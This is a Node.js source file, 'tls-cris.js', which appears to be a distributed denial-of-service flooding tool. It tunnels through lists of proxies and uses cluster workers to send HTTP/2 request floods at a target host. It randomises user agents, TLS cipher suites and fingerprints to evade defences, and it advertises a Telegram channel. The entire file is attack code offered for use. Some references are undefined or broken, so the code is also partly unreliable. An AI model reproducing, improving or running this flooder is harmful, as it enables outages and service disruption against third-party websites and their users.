const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const scp = require("set-cookie-parser");
const crypto = require('crypto');
const UserAgent = require('user-agents');
const fs = require('fs');
var colors = require('colors');
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (tsuneo) {});

if (process.argv.length < 7) {
  console.log('node tls-cris.js host time rps threads proxy'.rainbow);
  process.exit();
}

const headers = {};

function readLines(devontrey) {
  return fs.readFileSync(devontrey, 'utf-8').toString().split(/\r?\n/);
}

function randomIntn(ravonda, nirvaan) {
  return Math.floor(Math.random() * (nirvaan - ravonda) + ravonda);
}

function randomElement(mitzy) {
  return mitzy[randomIntn(0, mitzy.length)];
}


const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  Rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  proxyFile: process.argv[6],
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    console.clear()
console.log('CRISXTOP | TLS'.bgRed);
console.log('--------------------------------------------');
console.log('Target:'.yellow + process.argv[2]);
console.log('Time:'.yellow + process.argv[3]);
console.log('Rate:'.yellow + process.argv[4]);
console.log('Thread:'.yellow + process.argv[5]);
console.log('--------------------------------------------');
console.log('Note:'.blue + 'My channel: https://t.me/rainbowc2'.rainbow);
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}

class NetSocket {
  constructor() {}

  HTTP(_0xc92779, _0x59f60c) {
    const beonica = _0xc92779.address.split(':');
    const aimar = beonica[0];
    const enayah = `CONNECT ${_0xc92779.address}:443 HTTP/1.1\r\nHost: ${_0xc92779.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
    const eurasia = Buffer.from(enayah);
    const trequon = net.connect({
      host: _0xc92779.host,
      port: _0xc92779.port,
    });

    trequon.setTimeout(_0xc92779.timeout * 100000);
    trequon.setKeepAlive(true, 100000);

    trequon.on('connect', () => {
      trequon.write(eurasia);
    });

    trequon.on('data', (dontario) => {
      const samoan = dontario.toString('utf-8');
      const adien = samoan.includes('HTTP/1.1 200');

      if (adien === false) {
        trequon.destroy();
        return _0x59f60c(undefined, 'error: invalid response from proxy server');
      }

      return _0x59f60c(trequon, undefined);
    });

    trequon.on('timeout', () => {
      trequon.destroy();
      return _0x59f60c(undefined, 'error: timeout exceeded');
    });

    trequon.on('error', (elric) => {
      trequon.destroy();
      return _0x59f60c(undefined, 'error: ' + elric);
    });
  }
}
function getRandomUserAgent() {
  const osList = ['Windows', 'Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
  const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
  const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
  const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
  const manufacturerList = ['Windows', 'Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
  const os = osList[Math.floor(Math.random() * osList.length)];
  const browser = browserList[Math.floor(Math.random() * browserList.length)];
  const language = languageList[Math.floor(Math.random() * languageList.length)];
  const country = countryList[Math.floor(Math.random() * countryList.length)];
  const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
  const version = Math.floor(Math.random() * 100) + 1;
  const randomOrder = Math.floor(Math.random() * 6) + 1;
  const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
  const encryptedString = btoa(userAgentString);
  let finalString = '';
  for (let i = 0; i < encryptedString.length; i++) {
    if (i % randomOrder === 0) {
      finalString += encryptedString.charAt(i);
    } else {
      finalString += encryptedString.charAt(i).toUpperCase();
    }
  }
  function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
  }
  return finalString;
}
function getRandomTLS13CipherSuite() {
  // Danh sách các cipher suites TLS 1.3
  const tls13CipherSuites = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_128_CCM_8_SHA256',
  ];

  // Ch?n m?t cipher suite ng?u nhiên t? danh sách
  const randomIndex = crypto.randomInt(0, tls13CipherSuites.length);
  const randomCipherSuite = tls13CipherSuites[randomIndex];

  return randomCipherSuite;
}

const randomTLS13CipherSuite = getRandomTLS13CipherSuite();
function generateRandomFingerprint() {
  // T?o m?t chu?i ng?u nhiên có d? dài 32 bytes (256 bits)
  const randomBytes = crypto.randomBytes(32);
  
  // Chuy?n d?i chu?i bytes thành d?ng hex
  const fingerprint = randomBytes.toString('hex');
  
  return fingerprint;
}
const randomFingerprint = generateRandomFingerprint();
const Header = new NetSocket();

headers[':method'] = 'GET';
headers[':path'] = parsedTarget.path;
headers.GET = "/HTTP/2";
headers[':scheme'] = 'https';
headers.Referer = "https://" + parsedTarget.host + parsedTarget.path;
headers["sec-ch-ua-full-version-list"] = getRandomUserAgent();
headers.accept = randomElement(accept_header);
headers['accept-language'] = randomElement(lang_header);
headers['accept-encoding'] = 'gzip, deflate, br'; 
headers.Connection = 'keep-alive';
headers['upgrade-insecure-requests'] = '1';
headers.TE = 'trailers';
headers["x-forwarded-proto"] = "https";
headers['x-requested-with'] = 'XMLHttpRequest';
headers.pragma = 'no-cache';
headers.Cookie = cookieString(scp.parse(response["set-cookie"]))

function runFlooder() {
  const torren = randomElement(proxies);
  const cristie = torren.split(':');
  const kaion = new UserAgent();
  var ethian = kaion.toString();
  headers[':authority'] = parsedTarget.host;
  headers['user-agent'] = getRandomUserAgent();

  const gelisha = {
    host: cristie[0],
    port: parseInt(cristie[1]),
    address: `${parsedTarget.host}:443`,
    timeout: 100,
  };

  Header.HTTP(gelisha, (khaliliah, jaelynne) => {
    if (jaelynne) {
      return;
    }
    khaliliah.setKeepAlive(true, 100000);

    const jekori = {
      ALPNProtocols: ['h2'],
      followAllRedirects: true,
      challengeToSolve: 10,
      clientTimeout: 5000,
      clientlareMaxTimeout: 15000,
      echdCurve: 'GREASE:X25519:x25519',
      ciphers : randomTLS13CipherSuite,
      rejectUnauthorized: false,
      socket: khaliliah,
      decodeEmails: false,
      honorCipherOrder: true,
      requestCert: true,
      secure: true,
      port: 443,
      fingerprint: randomFingerprint,
      uri: parsedTarget.host,
      servername: parsedTarget.host,
    };

    const antowine = tls.connect(443, parsedTarget.host, jekori);
    antowine.setKeepAlive(true, 600000);

    const broghan = http2.connect(`https://${parsedTarget.host}`, {
      protocol: 'https:',
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false,
      },
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => antowine,
      socket: khaliliah,
    });

    broghan.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 20000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      maxFrameSize: 16400,
      enablePush: false,
    });

    broghan.on('connect', () => {
      const bracha = setInterval(() => {
        for (let tailani = 0; tailani < args.Rate; tailani++) {
          const verdena = broghan.request(headers);broghan.request(headers).on('response', (colinda) => {
            verdena.close();
            verdena.destroy();
            return;
          });
          verdena.end();
        }
      }, 1000);
    });

    broghan.on('close', () => {
      broghan.destroy();
      khaliliah.destroy();
      return;
    });

    broghan.on('error', (avanthika) => {
      broghan.destroy();
      khaliliah.destroy();
      return;
    });
  });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);






